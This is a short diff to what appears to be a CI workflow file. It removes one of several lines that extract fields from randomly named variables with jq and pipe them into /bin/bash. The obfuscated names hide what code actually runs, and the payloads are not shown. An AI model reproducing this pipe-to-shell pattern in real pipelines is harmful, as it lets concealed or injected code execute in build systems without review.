@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$j19016" | jq -r .nsguo49 | /bin/bash
           printf '%s' "$i96" | jq -r .dxskm8387 | /bin/bash
           echo $bf29121 | jq -r .rt29907 | /bin/bash
-          echo $hi58 | jq -r .rit05 | /bin/bash
           echo $iiph260 | jq -r .lrddv61631 | /bin/bash
 
       - name: Archive results
